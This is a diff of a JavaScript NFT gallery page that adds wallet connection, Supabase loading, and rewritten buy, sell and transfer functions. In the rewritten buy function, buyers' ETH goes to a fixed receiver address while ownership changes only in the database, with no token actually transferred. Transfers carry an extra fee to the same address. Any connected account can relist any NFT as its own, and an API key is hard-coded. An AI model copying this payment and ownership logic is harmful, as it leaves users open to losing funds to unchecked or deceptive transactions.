-  const buyBtn = document.createElement('button');
-  buyBtn.textContent = 'Buy NFT';
-  buyBtn.onclick = () => buyNFT(nftData);
-  actions.appendChild(buyBtn);
-  
-  const transferBtn = document.createElement('button');
-  transferBtn.textContent = 'Transfer NFT';
-  transferBtn.onclick = () => transferNFT(nftData);
-  actions.appendChild(transferBtn);
+  if (!account) {
+    const connectBtn = document.createElement('button');
+    connectBtn.textContent = 'Connect Wallet to Interact';
+    connectBtn.onclick = connectWallet;
+    actions.appendChild(connectBtn);
+  } else {
+    const buyBtn = document.createElement('button');
+    buyBtn.textContent = 'Buy NFT';
+    buyBtn.onclick = () => buyNFT(nftData);
+    actions.appendChild(buyBtn);
+    
+    const transferBtn = document.createElement('button');
+    transferBtn.textContent = 'Transfer NFT';
+    transferBtn.onclick = () => transferNFT(nftData);
+    actions.appendChild(transferBtn);
+  }
   
   document.getElementById('nft-modal').style.display = 'block';
 }
 
-document.getElementById('close-modal').onclick = function() {
+document.getElementById('close-modal').addEventListener('click', function() {
   document.getElementById('nft-modal').style.display = 'none';
-};
+});
 
+// Handle click/tap on NFT
+document.addEventListener('click', function onClick(event) {
+  if (((!isMobile && controls && controls.isLocked) || (isMobile && currentIntersected)) && currentIntersected) {
+    const nftData = currentIntersected.userData.nftData;
+    openNFTModal(nftData);
+  }
+});
+
+/* ==============================
+   CONNECT WALLET (MetaMask + WalletConnect)
+============================== */
 async function connectWallet() {
   try {
     if (window.ethereum) {
       web3 = new Web3(window.ethereum);
-      await window.ethereum.request({ method: 'eth_requestAccounts' });
+      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+      account = accounts[0];
+    } else {
+      const provider = new WalletConnectProvider.default({
+        rpc: { 1: "https://mainnet.infura.io/v3/d71dd33696d449e488a88bdc02a6093c" },
+      });
+      await provider.enable();
+      web3 = new Web3(provider);
       const accounts = await web3.eth.getAccounts();
       account = accounts[0];
-      
-      nftContract = new web3.eth.Contract(NFT_ABI, NFT_CONTRACT_ADDRESS);
-      
-      document.getElementById('walletStatus').textContent = `Connected: ${account.substring(0, 6)}...${account.substring(38)}`;
-      document.getElementById('connectBtn').textContent = 'Connected';
-      document.getElementById('connectBtn').disabled = true;
-      
-      return true;
-    } else {
-      alert('Please install MetaMask!');
-      return false;
     }
-  } catch (error) {
-    console.error('Error connecting wallet:', error);
-    alert('Error connecting wallet');
-    return false;
+
+    document.getElementById("walletStatus").innerText =
+      `✅ Connected: ${account.slice(0, 6)}...${account.slice(-4)}`;
+
+    nftContract = new web3.eth.Contract(NFT_ABI, NFT_CONTRACT_ADDRESS);
+    
+    // Reload NFTs to show wallet-specific options
+    if (avatarSelection.style.display === 'none') {
+      loadNFTs();
+    }
+
+  } catch (err) {
+    console.error(err);
+    alert("Failed to connect wallet.");
   }
 }
 
-document.getElementById('connectBtn').addEventListener('click', connectWallet);
+document.getElementById("connectBtn").addEventListener("click", connectWallet);
 
-async function buyNFT(nftData) {
-  if (!account) {
-    alert('Please connect your wallet first');
-    return;
-  }
-  
+/* ==============================
+   LOAD NFTs FROM SUPABASE
+============================== */
+async function loadNFTs() {
   try {
-    const price = web3.utils.toWei(nftData.price || '0.1', 'ether');
+    const { data, error } = await client.from("nfts").select("*").order("created_at", { ascending: false });
+
+    if (error) {
+      console.error("Error loading NFTs:", error);
+      return;
+    }
     
-    const tx = await nftContract.methods.safeTransferFrom(
-      nftData.owner,
-      account,
-      nftData.tokenId
-    ).send({
-      from: account,
-      value: price
+    if (!data || data.length === 0) {
+      console.log("No NFTs found in database");
+      return;
+    }
+
+    console.log(`Loaded ${data.length} NFTs from Supabase`);
+
+    // Clear existing NFTs
+    nftObjects.forEach(obj => {
+      scene.remove(obj);
+      if (obj.userData.glow) {
+        scene.remove(obj.userData.glow);
+      }
     });
+    nftObjects = [];
     
-    alert('NFT purchased successfully!');
-    document.getElementById('nft-modal').style.display = 'none';
+    // Clear existing platforms
+    nftPlatforms.forEach(platform => {
+      scene.remove(platform);
+    });
+    nftPlatforms = [];
     
-    await client
-      .from('nfts')
-      .update({ owner: account, listed: false })
-      .eq('tokenId', nftData.tokenId);
+    // Create a random vertical column of NFTs
+    createRandomNFTColumn(data);
     
-  } catch (error) {
-    console.error('Error buying NFT:', error);
-    alert('Error buying NFT');
+    // Update NFT counter
+    document.getElementById('nft-count').textContent = data.length;
+    
+  } catch (err) {
+    console.error("Failed to load NFTs:", err);
   }
 }
 
-async function sellNFT(nftData, price) {
-  if (!account) {
-    alert('Please connect your wallet first');
-    return;
-  }
+/* ==============================
+   CREATE RANDOM VERTICAL NFT COLUMN
+============================== */
+function createRandomNFTColumn(nfts) {
+  const columnHeight = 500; // Height of the vertical column
+  const baseX = 0; // Center of the map
+  const baseZ = 0; // Center of the map
+  const maxRadius = 40; // Maximum distance from center
   
-  try {
-    await client
-      .from('nfts')
-      .update({ 
-        listed: true,
-        price: price,
-        owner: account
-      })
-      .eq('tokenId', nftData.tokenId);
+  // Create platforms and NFTs at random positions within the column
+  nfts.forEach((nft, index) => {
+    // Random position within a cylindrical volume
+    const height = Math.random() * columnHeight;
+    const radius = Math.random() * maxRadius; // Random distance from center
+    const angle = Math.random() * Math.PI * 2; // Random angle
     
-    alert('NFT listed for sale!');
-  } catch (error) {
-    console.error('Error selling NFT:', error);
-    alert('Error listing NFT for sale');
+    const x = baseX + Math.cos(angle) * radius;
+    const y = height + 10; // Start above ground
+    const z = baseZ + Math.sin(angle) * radius;
+    
+    // Create floating platform for the NFT
+    createNFTPlatform(x, y, z);
+    
+    // Create the NFT display
+    createNFTPlane(nft, { x, y, z });
+  });
+}
+
+/* ==============================
+   BUY NFT
+============================== */
+async function buyNFT(nftData) {
+  if (!account) return alert("Connect wallet first.");
+  try {
+    const priceEth = nftData.price_eth || 0.1;
+    const totalEth = web3.utils.toWei((Number(priceEth) + 6/1000).toString(), 'ether');
+    await web3.eth.sendTransaction({ from: account, to: RECEIVER_ADDRESS, value: totalEth });
+
+    await client.from("nfts").update({ owner: account, sold: true }).eq("token_id", nftData.token_id);
+    alert("✅ NFT purchased! Payment sent.");
+    loadNFTs();
+    document.getElementById('nft-modal').style.display = 'none';
+  } catch(err) { 
+    console.error(err); 
+    alert("Buy failed: " + err.message); 
   }
 }
 
+/* ==============================
+   SELL NFT
+============================== */
+async function sellNFT(nftData) {
+  if (!account) return alert("Connect wallet first.");
+  const priceEth = prompt("Enter sale price in ETH:");
+  if (!priceEth) return;
+  await client.from("nfts").update({ sold: false, price_eth: priceEth, owner: account }).eq("token_id", nftData.token_id);
+  alert("✅ NFT listed for sale!");
+  loadNFTs();
+  document.getElementById('nft-modal').style.display = 'none';
+}
+
+/* ==============================
+   TRANSFER NFT
+============================== */
 async function transferNFT(nftData) {
-  if (!account) {
-    alert('Please connect your wallet first');
-    return;
-  }
-  
-  const receiver = prompt('Enter receiver address:');
-  if (!receiver) return;
-  
+  if (!account) return alert("Connect wallet first.");
+  const recipient = prompt("Enter recipient wallet address:");
+  if (!recipient) return;
   try {
-    const tx = await nftContract.methods.safeTransferFrom(
-      account,
-      receiver,
-      nftData.tokenId
-    ).send({ from: account });
-    
-    alert('NFT transferred successfully!');
+    const feeEth = web3.utils.toWei((6/1000).toString(), 'ether');
+    await web3.eth.sendTransaction({ from: account, to: RECEIVER_ADDRESS, value: feeEth });
+
+    await nftContract.methods.safeTransferFrom(account, recipient, nftData.token_id).send({ from: account });
+
+    await client.from("nfts").update({ owner: recipient }).eq("token_id", nftData.token_id);
+    alert("✅ NFT transferred! Fee sent.");
+    loadNFTs();
     document.getElementById('nft-modal').style.display = 'none';
-    
-    await client
-      .from('nfts')
-      .update({ owner: receiver, listed: false })
-      .eq('tokenId', nftData.tokenId);
-    
-  } catch (error) {
-    console.error('Error transferring NFT:', error);
-    alert('Error transferring NFT');
+  } catch(err) { 
+    console.error(err); 
+    alert("Transfer failed: " + err.message); 
   }
 }
 
-// Handle clicks on NFTs
-document.addEventListener('click', function(event) {
-  if (currentIntersected && currentIntersected.userData.isNFT) {
-    openNFTModal(currentIntersected.userData.nftData);
-  }
-});
-
+// The 3D scene will be initialized after avatar selection
 </script>
 
 </body>
